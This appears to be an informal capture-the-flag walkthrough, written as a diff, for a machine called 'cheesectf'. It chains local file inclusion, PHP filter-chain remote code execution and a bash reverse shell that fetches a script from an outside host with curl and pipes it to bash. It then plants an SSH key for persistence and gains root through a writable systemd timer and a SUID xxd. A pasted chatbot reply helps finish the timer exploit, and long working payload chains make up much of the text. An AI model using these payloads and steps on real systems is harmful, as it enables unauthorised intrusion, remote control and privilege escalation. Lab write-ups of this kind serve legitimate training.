@@ -1,0 +1,196 @@
+STEP 1:-
+using nmap we find open ports, here we show the all ports are open because the server is spoof all ports.
+
+STEP 2:-
+enumarate files using dirsearch and fuff we find messages.html file are vuln
+http://ip/messages.html 
+after click on link this site redirect to this link and i show the url says 
+http://web[ip]/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+we show and change to /etc/passwd
+http://10.10.23.122/secret-script.php?file=php://filter/resource=/etc/passwd
+that's work so, i go to the browser and search the php filter rce, browser show me the php fillter chain generator 
+
+https://github.com/synacktiv/php_filter_chain_generator
+
+and download and follow instruction.
+------------------------------------------------------------------------------------------------------------------------------------
+like:-
+PHP filter chain generator
+
+A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!
+Usage
+Help
+
+$ python3 php_filter_chain_generator.py --help             
+usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]
+
+PHP filter chain generator.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
+  --rawbase64 RAWBASE64
+                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.
+
+Parameters
+
+    chain : a PHP chain you want to inject
+
+Example of a filter chain generating <?php phpinfo(); ?>
+
+$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
+[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+
+The chain <?php phpinfo(); ?> is indeed prepended
+
+php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp');"
+<?php phpinfo(); ?>  �@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�
+
+    rawbase64 : Put the base64 that will be prepended before the last decode, useful while debugging your PHP filter chains!
+
+Example of a test to verify if a chain works as expected :
+
+$ python3 php_filter_chain_generator.py --rawbase64 'cwwwwc'
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp
+
+The prepended base64 is 'cwwwc' as expected, no alteration, so the 'w' filter chain is considered valid.
+
+$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp');"
+cwwwwcGyQpQw+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+AD0APQ-
+
+Future improvements
+
+    The chains from this repository can greatly be shortened by using shorter aliases, in the future it would be great to change them.
+    Some chains could be simplified to gain size on filters.
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+STEP3:-after generate payload paste to the website
+
+http://web[ip]/secret-script.php?file=php://filter/resource=&...here...&
+
+than i show the web give all detail about php page and i show this payload work
+
+STEP 4:-than i go to browser and search php filter reverse shell
+
+https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
+
+and follow the instruction
+------------------------------------------------------------------------------------------------------------------------------------
+like:-
+python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
+
+We only have to do is paste the above generated payload to /?page=<genrated_chain>.
+Reverse Shell
+
+First create a shell script named "revshell" in local machine.
+
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+Then create a chain using a generator.
+Replace the ip address with your own.
+
+# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
+python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
+
+We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.
+
+# terminal 1
+sudo python3 -m http.server 80
+
+# terminal 2
+nc -lvnp 4444
+------------------------------------------------------------------------------------------------------------------------------------
+
+STEP 5:-
+here we find .ssh file using ls -la we show the .ssh file is read and write both permission allow
+so, i go to the .ssh file and find ssh key file than goto my local machine and generate ssh public key
+ssh-keygen
+ copy the key and paste into target shell ssh key file
+ 
+ echo "[key]" >> [key file name]
+ 
+ than goto by terminal and type ssh [username]@[ip]
+ than we connect to server using ssh shell
+ 
+STEP 6:-
+than i want to escalat my privaligies and become root
+
+cmd:-sudo -l
+
+ans:-
+comte@cheesectf:/opt$ sudo -1
+User comte may run the following commands on cheesectf:
+[ALL] NOPASSWD: /bin/systemctl daemon-reload
+[ALL] NOPASSWD: /bin/systemctl restart exploit.timer
+[ALL] NOPASSWD: /bin/systemctl start exploit.timer
+[ALL] NOPASSWD: /bin/systemctl enable exploit.timer
+
+than i open the file exploite timer and show 
+ 
+cmd:- comte@cheesectf:/etc/systemd/system$ cat exploit.timer
+[Unit]
+Description=Exploit Timer
+[Timer]
+OnBootSec=
+[Install]
+WantedBy=timers.target
+
+STEP 7:-
+than goto chatgpt and past this 
+------------------------------------------------------------------------------------------------------------------------------------
+ans:- 
+
+Good catch, Khush! That exploit.timer file looks like it's meant to schedule a malicious or testing timer-based systemd job, but the critical value OnBootSec= is empty, which means the timer won’t run.
+
+To fix it (or complete it for CTF purposes), you need to specify how long after system boot the timer should trigger.
+✅ Corrected example:
+
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=10s  # or 1min, 5min, etc.
+
+[Install]
+WantedBy=timers.target
+
+You can pick a time like OnBootSec=5s (5 seconds after boot) if you're testing a quick exploit.
+🔧 Steps to make it work:
+
+    Edit the file:
+
+sudo nano /etc/systemd/system/exploit.timer
+
+Add a valid time value, like OnBootSec=10s.
+
+Enable and start the timer:
+
+sudo systemctl daemon-reexec  # in some CTFs this is needed
+sudo systemctl daemon-reload
+sudo systemctl enable exploit.timer
+sudo systemctl start exploit.timer
+
+Check status:
+
+    systemctl status exploit.timer
+
+Make sure you also have a matching exploit.service file in the same directory, or the timer will fail.
+
+Want help crafting the [Service] file too? Here's how you can create a simple matching exploit.service or test it manually.
+------------------------------------------------------------------------------------------------------------------------------------
+
+STEP 8:-
+After starting the exploit.timer, the service created the xxd binary in the /opt/ directory, owned by root and with the SUID bit set. I then utilized a payload from GTFOBins to escalate my privileges and successfully gained root access. 
+
+ex:-
+     
+
+Sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    LFILE=file_to_read
+    sudo xxd "$LFILE" | xxd -r
+
